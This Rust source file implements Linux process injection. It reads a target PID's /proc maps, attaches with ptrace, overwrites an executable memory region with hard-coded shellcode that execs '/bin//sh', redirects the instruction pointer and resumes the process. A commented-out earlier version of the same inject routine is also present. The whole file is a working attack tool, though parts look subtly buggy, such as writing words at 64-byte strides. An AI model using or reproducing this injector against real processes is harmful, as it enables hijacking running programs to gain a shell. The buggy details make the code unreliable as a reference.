
use nix::sys::ptrace::{self, AddressType};

use nix::sys::signal::Signal::{self, SIGCONT, SIGTRAP};

use nix::unistd::Pid;

use nix::sys::mman::{self, ProtFlags, mprotect};

use nix::libc::{posix_memalign};

use std::fs::File;
use std::io::{self, BufRead};
use std::ops::Index;
use std::path::Path;


use libc::{malloc, c_void, pid_t, ptrace, PTRACE_PEEKDATA};
use std::{env, mem};


fn main() {


    let raw_pid:Vec<String> = env::args().collect();
    let mut shellcode = [
        0x48, 0xc7, 0xc0, 0x04, 0x00, 0x00, 0x00, 0x48,
        0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, 0x48, 0x31,
        0xd2, 0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e,
        0x2f, 0x73, 0x68, 0x48, 0xc1, 0xef, 0x08, 0x57,
        0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0xb0, 0x3b,
        0x0f, 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,                                      
    ];

    let pid = Pid::from_raw(raw_pid[1].parse().unwrap());

    let mmaps = map_memory(pid);

/* 
    for item in mmaps {
        println!("------\nNAME: {}\nREAD: {:?}\nWRITE: {:?}\nEXECUTE: {:?}\nSIZE: {:?}\nSTART: {:?}\nEND: {:?}", item.name, item.read, item.write, item.execute, item.size, item.start, item.end);
    }
*/
    unsafe {inject(pid, &mut shellcode, mmaps);}

}


fn map_memory(pid:Pid)->Vec<memory_map>{

    let filepath = format!("/proc/{}/maps", pid.to_string());
    let mmap = File::open(filepath).unwrap();
    let mut mmap_vector:Vec<Vec<String>> = Vec::new();
    let lines = io::BufReader::new(mmap).lines();
    for line in lines {
        mmap_vector.push(line.unwrap().split_whitespace().map(str::to_string).collect());
    }
    
    // Checks to see if the given string vector slice has read and execute permissions.
    let permissions = |perms:&Vec<String>| perms[1].contains("r") && perms[1].contains("x"); 

    mmap_vector.retain(permissions);

    let mut mmaps = Vec::new();

    for vector in mmap_vector {
        mmaps.push(memory_map::new(vector[0].clone(),vector[1].clone(),vector[5].clone()));
    }

    return mmaps;


}

unsafe fn inject(pid: Pid, shellcode: &mut [u8], mapvector:Vec<memory_map>){

    let map = mapvector.iter().find(|x| x.execute && x.read && x.size > 1000 as *mut c_void).unwrap();

    ptrace::attach(pid)
            .expect("PTrace failed to attach.");

    let _ = nix::sys::wait::waitpid(pid, None);

    let regs = ptrace::getregs(pid)
                        .expect("Failed to read registers.");


    println!("Non-aligned: {:?}, Check: {:?}", regs.rip as *mut c_void, regs.rip as u64 & 7 == 0);

    let start = map.start as u64;
    let mut rip:u64;

    if start & 7 == 0 {
        rip = start;
    } else {
        rip = 0;
        for i in 0..8 {
            if start+i & 7 == 0 {
                rip = start+i;
            }
        }
    }

    println!("Aligned: {:?}, Check: {:?}", rip as *mut c_void, rip as u64 & 7 == 0);

    let mut data = Vec::new();

    for word in shellcode.chunks(8){

        // eventually you have to make this capable of 
        // dealing with odd numbers of bytes lol
        let combined = i64::from_le_bytes([word[0],word[1],word[2],word[3],word[4],word[5],word[6],word[7]]) as *mut c_void;
        data.push(combined);
    }

    


    for (length, item) in data.into_iter().enumerate() {
        let ptr = rip as u64 + (length * 64) as u64;
        let addr = ptr as AddressType;

        let old_word = ptrace::read(pid, addr)
                                            .expect("Failed read.") as *mut c_void;
        println!("RD WORD: {:?} @ {:?}", old_word, addr);


        println!("WT WORD: {:?} to {:?}", item, addr);

        ptrace::write(pid, addr, item);
    }

    let mut new_regs = regs;
    new_regs.rip = rip + 2;
    let _ = ptrace::setregs(pid, new_regs);

    let _ = ptrace::cont(pid, Some(SIGCONT));
    println!("Successful continue.");



/* 
    let mut word:u64;

    if regs.rip & 7 == 0 {
        word = ptrace(PTRACE_PEEKDATA, pid, regs.rip) as u64;
    } else {
        word =
        for i in 0..8 {
            let byte = ptrace(PTRACE_PEEKDATA, pid, regs.rip+i, 0) as u64;
            word |= byte << (i*8);
        }
    }
*/



}

/* 

unsafe fn inject(pid: Pid, shellcode: &mut [u8], mapvector:Vec<memory_map>) {
    // let ptr = malloc(shellcode.len()) as *mut c_void;
    // Converts our byte vector to a *mut c_void so it can be written.
    // let data = shellcode.as_mut_ptr() as *mut c_void;
    // let addr = ptr as AddressType;

    let prot = ProtFlags::all();
    // Should probably find a cool way to determine size.
    let map = mapvector.iter().find(|x| x.execute && x.read && x.size > 1000 as *mut c_void).unwrap();
    println!("PID: {}\nMemory Map:\n{:?}", pid, map);
    

    println!("Attaching to {}", pid);
    ptrace::attach(pid)
                .expect("ptrace failed to attach to PID.");

    let _ = nix::sys::wait::waitpid(pid, None);

    let mut current_registers = ptrace::getregs(pid)
                                    .expect("Failed to get registers.");


    let old_rip = current_registers.rip;


    let mut data = Vec::new();

    for word in shellcode.chunks(8){

        // eventually you have to make this capable of 
        // dealing with odd numbers of bytes lol
        let combined = i64::from_le_bytes([word[0],word[1],word[2],word[3],word[4],word[5],word[6],word[7]]) as *mut c_void;
        data.push(combined);
    }

    


    for (length, item) in data.into_iter().enumerate() {
        let ptr = map.start as u64 + (length * 64) as u64;
        let addr = ptr as AddressType;

        let old_word = ptrace::read(pid, addr)
                                            .expect("Failed read.") as *mut c_void;
        println!("RD WORD: {:?} @ {:?}", old_word, addr);


        println!("WT WORD: {:?} to {:?}", item, addr);

        ptrace::write(pid, addr, item);
    }



    let mut new_rip = map.start as u64;
    new_rip = new_rip + 2;

    // Apparently 2 bytes get yoinked from the RIP
    // upon detach.
    current_registers.rip = new_rip;

    dbg!(current_registers);

    let _ = ptrace::setregs(pid, current_registers);
    println!("Regs set");


    let _ = ptrace::cont(pid, Some(SIGCONT));
    println!("Successful continue.");


    let _ = ptrace::detach(pid, None);
    println!("Successful detach.")

}
*/

#[derive(Debug)]
pub struct memory_map {
    name:String,
    read:bool,
    write:bool,
    execute:bool,
    size:*mut c_void,
    start:*mut c_void,
    end:*mut c_void,
}

impl memory_map {
    pub fn new(address_range:String, permissions:String, name:String)->Self{
        let evaluate_perms = |y:&str| permissions.contains(y);
        let addresses:Vec<&str> = address_range.split("-").collect();

        let size = (i64::from_str_radix(addresses[1], 16).unwrap() - i64::from_str_radix(addresses[0],16).unwrap()) as *mut c_void;
        let start = i64::from_str_radix(addresses[0], 16).unwrap() as *mut c_void;
        let end = i64::from_str_radix(addresses[1], 16).unwrap() as *mut c_void;

        Self {
            name,
            read:evaluate_perms("r"),
            write:evaluate_perms("w"),
            execute:evaluate_perms("x"),
            size,
            start,
            end
        }
    }

}
